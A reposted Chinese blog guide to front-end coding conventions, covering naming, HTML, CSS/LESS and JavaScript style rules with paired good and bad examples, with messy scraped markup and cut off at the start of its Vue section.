href="https://www.cnblogs.com/suwanbin/p/13200530.html#4-constants-%E7%9B%AE%E5%BD%95">4) constants 目录</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#5-router-%E4%B8%8E-store-%E7%9B%AE%E5%BD%95">5) router 与 store 目录</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#6-views-%E7%9B%AE%E5%BD%95">6) views 目录</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#224-%E6%B3%A8%E9%87%8A%E8%AF%B4%E6%98%8E">2.2.4 注释说明</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#225-%E5%85%B6%E4%BB%96">2.2.5 其他</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E5%B0%BD%E9%87%8F%E4%B8%8D%E8%A6%81%E6%89%8B%E5%8A%A8%E6%93%8D%E4%BD%9C-dom">1) 尽量不要手动操作 DOM</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E5%88%A0%E9%99%A4%E6%97%A0%E7%94%A8%E4%BB%A3%E7%A0%81">2) 删除无用代码</a><br><a name="IACrB"></a></li></ul></li></ul><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><blockquote><p>从某位 up 主那里嫖来的，转载一下，留个印象，日后再看，具体地址忘了， ，，后续再补</p></blockquote><p><a name="pa9JL"></a></p><h1 id="前端代码规范"><a href="#前端代码规范" class="headerlink" title="前端代码规范"></a>前端代码规范</h1><p>Front Standard Guide<br><a name="ceipr"></a></p><h1 id="前端-JS-项目开发规范"><a href="#前端-JS-项目开发规范" class="headerlink" title="前端 JS 项目开发规范"></a>前端 JS 项目开发规范</h1><p>规范的目的是为了编写高质量的代码，让你的团队成员每天得心情都是愉悦的，大家在一起是快乐的。<br />引自《阿里规约》的开头片段：<br /><em>—-现代软件架构的复杂性需要协同开发完成，如何高效地协同呢？无规矩不成方圆，无规范难以协同，比如，制订交通法规表面上是要限制行车权，实际上是保障公众的人身安全，试想如果没有限速，没有红绿灯，谁还敢上路行驶。对软件来说，适当的规范和标准绝不是消灭代码内容的创造性、优雅性，而是限制过度个性化，以一种普遍认可的统一方式一起做事，提升协作效率，降低沟通成本。代码的字里行间流淌的是软件系统的血液，质量的提升是尽可能少踩坑，杜绝踩重复的坑，切实提升系统稳定性，码出质量。</em><br><a name="itBp8"></a></p><h1 id="一、编程规约"><a href="#一、编程规约" class="headerlink" title="一、编程规约"></a>一、编程规约</h1><p><a name="YKrNh"></a></p><h3 id="一-命名规范"><a href="#一-命名规范" class="headerlink" title="(一)命名规范"></a>(一)命名规范</h3><p><a name="tQAwT"></a></p><h4 id="1-1-1-项目命名"><a href="#1-1-1-项目命名" class="headerlink" title="1.1.1 项目命名"></a>1.1.1 项目命名</h4><p>全部采用小写方式， 以中划线分隔。<br />正例：<code>mall-management-system</code><br />反例：<code>mall_management-system / mallManagementSystem</code><br><a name="pRoTq"></a></p><h4 id="1-1-2-目录命名"><a href="#1-1-2-目录命名" class="headerlink" title="1.1.2 目录命名"></a>1.1.2 目录命名</h4><p>全部采用小写方式， 以中划线分隔，有复数结构时，要采用复数命名法， 缩写不用复数<br />正例： <code>scripts / styles / components / images / utils / layouts / demo-styles / demo-scripts / img / doc</code><br />反例： <code>script / style / demo_scripts / demoStyles / imgs / docs</code><br />【特殊】VUE 的项目中的 components 中的组件目录，使用 kebab-case 命名<br />正例： <code>head-search / page-loading / authorized / notice-icon</code><br />反例： <code>HeadSearch / PageLoading</code><br />【特殊】VUE 的项目中的除 components 组件目录外的所有目录也使用 kebab-case 命名<br />正例： <code>page-one / shopping-car / user-management</code><br />反例： <code>ShoppingCar / UserManagement</code><br><a name="rddhB"></a></p><h4 id="1-1-3-JS、CSS、SCSS、HTML、PNG-文件命名"><a href="#1-1-3-JS、CSS、SCSS、HTML、PNG-文件命名" class="headerlink" title="1.1.3 JS、CSS、SCSS、HTML、PNG 文件命名"></a>1.1.3 JS、CSS、SCSS、HTML、PNG 文件命名</h4><p>全部采用小写方式， 以中划线分隔<br />正例： <code>render-dom.js / signup.css / index.html / company-logo.png</code><br />反例： <code>renderDom.js / UserManagement.html</code><br><a name="Odhei"></a></p><h4 id="1-1-4-命名严谨性"><a href="#1-1-4-命名严谨性" class="headerlink" title="1.1.4 命名严谨性"></a>1.1.4 命名严谨性</h4><p>代码中的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。 说明：正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，即使纯拼音命名方式也要避免采用<br />正例：<code>henan / luoyang / rmb 等国际通用的名称，可视同英文。</code><br />反例：<code>DaZhePromotion [打折] / getPingfenByName() [评分] / int 某变量 = 3</code><br /><strong>杜绝完全不规范的缩写，避免望文不知义：</strong><br />反例：AbstractClass“缩写”命名成 AbsClass；condition“缩写”命名成 condi，此类随意缩写严重降低了代码的可阅读性。<br><a name="Bif0f"></a></p><h3 id="二-HTML-规范-（Vue-Template-同样适用）"><a href="#二-HTML-规范-（Vue-Template-同样适用）" class="headerlink" title="(二)HTML 规范 （Vue Template 同样适用）"></a>(二)HTML 规范 （Vue Template 同样适用）</h3><p><a name="wviLN"></a></p><h4 id="1-2-1-HTML-类型"><a href="#1-2-1-HTML-类型" class="headerlink" title="1.2.1 HTML 类型"></a>1.2.1 HTML 类型</h4><p>推荐使用 HTML5 的文档类型申明： .<br />（建议使用 text&#x2F;html 格式的 HTML。避免使用 XHTML。XHTML 以及它的属性，比如 application&#x2F;xhtml+xml 在浏览器中的应用支持与优化空间都十分有限）。</p><ul><li>规定字符编码</li><li>IE 兼容模式</li><li>规定字符编码</li><li>doctype 大写</li></ul><p>正例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot; /&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Page title&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;img src=&quot;images/company-logo.png&quot; alt=&quot;Company&quot; /&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><a name="pyaOp"></a></p><h4 id="1-2-2-缩进"><a href="#1-2-2-缩进" class="headerlink" title="1.2.2 缩进"></a>1.2.2 缩进</h4><p>缩进使用 2 个空格（一个 tab）<br />嵌套的节点应该缩进。<br><a name="KsTsF"></a></p><h4 id="1-2-3-分块注释"><a href="#1-2-3-分块注释" class="headerlink" title="1.2.3 分块注释"></a>1.2.3 分块注释</h4><p>在每一个块状元素，列表元素和表格元素后，加上一对 HTML 注释。注释格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a name=&quot;VlgQK&quot;&gt;&lt;/a&gt;</span><br><span class="line">### 1.2.4 语义化标签</span><br><span class="line">HTML5 中新增很多语义化标签，所以优先使用语义化标签，避免一个页面都是 div 或者 p 标签&lt;br /&gt;正例</span><br></pre></td></tr></table></figure><header></header><footer></footer><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反例</span><br></pre></td></tr></table></figure><div>  <p></p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;a name=&quot;zVtmd&quot;&gt;&lt;/a&gt;</span><br><span class="line">#### 1.2.5 引号</span><br><span class="line">使用双引号(&quot; &quot;) 而不是单引号(’ &#x27;) 。&lt;br /&gt;正例： ``&lt;br /&gt;反例： ``</span><br><span class="line">&lt;a name=&quot;xGJTL&quot;&gt;&lt;/a&gt;</span><br><span class="line">### (三) CSS 规范</span><br><span class="line">&lt;a name=&quot;KfxnO&quot;&gt;&lt;/a&gt;</span><br><span class="line">#### 1.3.1 命名</span><br><span class="line"></span><br><span class="line">- 类名使用小写字母，以中划线分隔</span><br><span class="line">- id 采用驼峰式命名</span><br><span class="line">- scss 中的变量、函数、混合、placeholder 采用驼峰式命名</span><br><span class="line"></span><br><span class="line">ID 和 class 的名称总是使用可以反应元素目的和用途的名称，或其他通用的名称，代替表象和晦涩难懂的名称&lt;br /&gt;不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.fw-800 {  font-weight: 800;}.red {  color: red;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐:</span><br><span class="line"></span><br></pre></td></tr></table></figure>.heavy {  font-weight: 800;}.important {  color: red;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;wNraB&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.2 选择器</span><br><span class="line"></span><br><span class="line">1)css 选择器中避免使用标签名&lt;br /&gt;从结构、表现、行为分离的原则来看，应该尽量避免 css 中出现 HTML 标签，并且在 css 选择器中出现标签名会存在潜在的问题。&lt;br /&gt;2)很多前端开发人员写选择器链的时候不使用 直接子选择器（注：直接子选择器和后代选择器的区别）。有时，这可能会导致疼痛的设计问题并且有时候可能会很耗性能。然而，在任何情况下，这是一个非常不好的做法。如果你不写很通用的，需要匹配到 DOM 末端的选择器， 你应该总是考虑直接子选择器。&lt;br /&gt;不推荐:</span><br><span class="line"></span><br></pre></td></tr></table></figure>.content .title {  font-size: 2rem;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐:</span><br><span class="line"></span><br></pre></td></tr></table></figure>.content > .title {  font-size: 2rem;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;uXLBl&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.3 尽量使用缩写属性</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>border-top-style: none;font-family: palatino, georgia, serif;font-size: 100%;line-height: 1.6;padding-bottom: 2em;padding-left: 1em;padding-right: 1em;padding-top: 0;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>border-top: 0;font: 100%/1.6 palatino, georgia, serif;padding: 0 1em 2em;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;yp9l7&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.4 每个选择器及属性独占一行</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>button{  width:100px;height:50px;color:#fff;background:#00a0e9;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>button{  width:100px;  height:50px;  color:#fff;  background:#00a0e9;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;UNEPQ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.5 省略 0 后面的单位</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>div{  padding-bottom: 0px;  margin: 0em;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>div{  padding-bottom: 0;  margin: 0;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;osdhZ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.6 避免使用 ID 选择器及全局标签选择器防止污染全局样式</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>#header{  padding-bottom: 0px;  margin: 0em;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.header{  padding-bottom: 0px;  margin: 0em;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;z9fVV&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (四) LESS 规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;VEupf&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.4.1 代码组织</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;WMJWc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1)将公共 less 文件放置在 style/less/common 文件夹</span><br><span class="line"></span><br><span class="line">例:// color.less,common.less</span><br><span class="line">&lt;a name=&quot;oQbGV&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2)按以下顺序组织</span><br><span class="line"></span><br><span class="line">1、@import;&lt;br /&gt;2、变量声明;&lt;br /&gt;3、样式声明;</span><br><span class="line"></span><br></pre></td></tr></table></figure>@import "mixins/size.less";@default-text-color: #333;.page {  width: 960px;  margin: 0 auto;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;ND8fs&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.4.2 避免嵌套层级过多</span><br><span class="line"></span><br><span class="line">将嵌套深度限制在 3 级。对于超过 4 级的嵌套，给予重新评估。这可以避免出现过于详实的 CSS 选择器。&lt;br /&gt;避免大量的嵌套规则。当可读性受到影响时，将之打断。推荐避免出现多于 20 行的嵌套规则出现&lt;br /&gt;不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.main{  .title{    .name{       color:#fff    }  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.main-title{   .name{      color:#fff   }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;RoBJW&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (五) Javascript 规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;FqMuc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.1 命名</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;rGyyc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 采用小写驼峰命名 lowerCamelCase，代码中的命名均不能以下划线，也不能以下划线或美元符号结束</span><br><span class="line"></span><br><span class="line">反例： `_name / name_ / name$`</span><br><span class="line">&lt;a name=&quot;UCs3Y&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格，必须遵从驼峰形式</span><br><span class="line"></span><br><span class="line">正例： `localValue / getHttpMessage() / inputUserId`&lt;br /&gt;\*_**其中 method 方法命名必须是 动词 或者 动词+名词 形式\***_&lt;br /&gt;正例：`saveShopCarData /openShopCarInfoDialog`&lt;br /&gt;反例：`save / open / show / go`&lt;br /&gt;\*_**特此说明，增删查改，详情统一使用如下 5 个单词，不得使用其他（目的是为了统一各个端）\***_</span><br><span class="line"></span><br></pre></td></tr></table></figure>add / update / delete / detail / get<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**附： 函数方法常用的动词:**</span><br><span class="line"></span><br></pre></td></tr></table></figure>get 获取/set 设置,add 增加/remove 删除create 创建/destory 移除start 启动/stop 停止open 打开/close 关闭,read 读取/write 写入load 载入/save 保存,create 创建/destroy 销毁begin 开始/end 结束,backup 备份/restore 恢复import 导入/export 导出,split 分割/merge 合并inject 注入/extract 提取,attach 附着/detach 脱离bind 绑定/separate 分离,view 查看/browse 浏览edit 编辑/modify 修改,select 选取/mark 标记copy 复制/paste 粘贴,undo 撤销/redo 重做insert 插入/delete 移除,add 加入/append 添加clean 清理/clear 清除,index 索引/sort 排序find 查找/search 搜索,increase 增加/decrease 减少play 播放/pause 暂停,launch 启动/run 运行compile 编译/execute 执行,debug 调试/trace 跟踪observe 观察/listen 监听,build 构建/publish 发布input 输入/output 输出,encode 编码/decode 解码encrypt 加密/decrypt 解密,compress 压缩/decompress 解压缩pack 打包/unpack 解包,parse 解析/emit 生成connect 连接/disconnect 断开,send 发送/receive 接收download 下载/upload 上传,refresh 刷新/synchronize 同步update 更新/revert 复原,lock 锁定/unlock 解锁check out 签出/check in 签入,submit 提交/commit 交付push 推/pull 拉,expand 展开/collapse 折叠begin 起始/end 结束,start 开始/finish 完成enter 进入/exit 退出,abort 放弃/quit 离开obsolete 废弃/depreciate 废旧,collect 收集/aggregate 聚集<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;U6BUP&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) 常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长</span><br><span class="line"></span><br><span class="line">正例： `MAX_STOCK_COUNT`&lt;br /&gt;反例： `MAX_COUNT`</span><br><span class="line">&lt;a name=&quot;XZqGC&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.2 代码格式</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;v5DOh&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 使用 2 个空格进行缩进</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (x < y) {  x += 10;} else {  x += 1;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;FZldi&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 不同逻辑、不同语义、不同业务的代码之间插入一个空行分隔开来以提升可读性</span><br><span class="line"></span><br><span class="line">&gt; 说明：任何情形，没有必要插入多个空行进行隔开。</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;j7Oi0&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.3 字符串</span><br><span class="line"></span><br><span class="line">统一使用单引号(‘)，不使用双引号(“)。这在创建 HTML 字符串非常有好处：&lt;br /&gt;正例:</span><br><span class="line"></span><br></pre></td></tr></table></figure>let str = 'foo';let testDiv = '<div id="test"></div>';<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例:</span><br><span class="line"></span><br></pre></td></tr></table></figure>let str = 'foo';let testDiv = "<div id='test'></div>";<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;jf452&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.4 对象声明</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;n1rh3&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1)使用字面值创建对象</span><br><span class="line"></span><br><span class="line">正例： `let user = &#123;&#125;;`&lt;br /&gt;反例： `let user = new Object();`</span><br><span class="line">&lt;a name=&quot;fgjiv&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 使用字面量来代替对象构造器</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>var user = {  age: 0,  name: 1,  city: 3};<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>var user = new Object();user.age = 0;user.name = 0;user.city = 0;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;zlHHq&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.5 使用 ES6,7</span><br><span class="line"></span><br><span class="line">必须优先使用 ES6,7 中新增的语法糖和函数。这将简化你的程序，并让你的代码更加灵活和可复用。</span><br><span class="line"></span><br><span class="line">&gt; 必须强制使用 ES6, ES7 的新语法，比如箭头函数、await/async ， 解构， let ， for…of 等等</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;epQwk&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.6 括号</span><br><span class="line"></span><br><span class="line">下列关键字后必须有大括号（即使代码块的内容只有一行）：if, else, for, while, do, switch, try, catch, finally, with。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (condition) {  doSomething();}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (condition) doSomething();<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;IXqXg&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.7 undefined 判断</span><br><span class="line"></span><br><span class="line">永远不要直接使用 undefined 进行变量判断；使用 typeof 和字符串’undefined’对变量进行判断。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (typeof person === 'undefined') {    ...}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (person === undefined) {    ...}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;JgaPE&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.8 条件判断和循环最多三层</span><br><span class="line"></span><br><span class="line">条件判断能使用三目运算符和逻辑运算符解决的，就不要使用条件判断，但是谨记不要写太长的三目运算符。如果超过 3 层请抽成函数，并写清楚注释。</span><br><span class="line">&lt;a name=&quot;kAFRZ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.9 this 的转换命名</span><br><span class="line"></span><br><span class="line">对上下文 this 的引用只能使用’self’来命名</span><br><span class="line">&lt;a name=&quot;suHfw&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.10 慎用 console.log</span><br><span class="line"></span><br><span class="line">因 console.log 大量使用会有性能问题，所以在非 webpack 项目中谨慎使用 log 功能</span><br><span class="line">&lt;a name=&quot;Vcg1U&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"># 二、Vue 项目规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;l5N8N&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (一) Vue 编码基础</span><br><span class="line"></span><br><span class="line">vue 项目规范以 Vue 官方规范 （[https://cn.vuejs.org/v2/style-guide/）](https://cn.vuejs.org/v2/style-guide/%EF%BC%89) 中的 A 规范为基础，在其上面进行项目开发，故所有代码均遵守该规范。</span><br><span class="line"></span><br><span class="line">&gt; 请仔仔细细阅读 Vue 官方规范，切记，此为第一步。</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;I83ZE&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 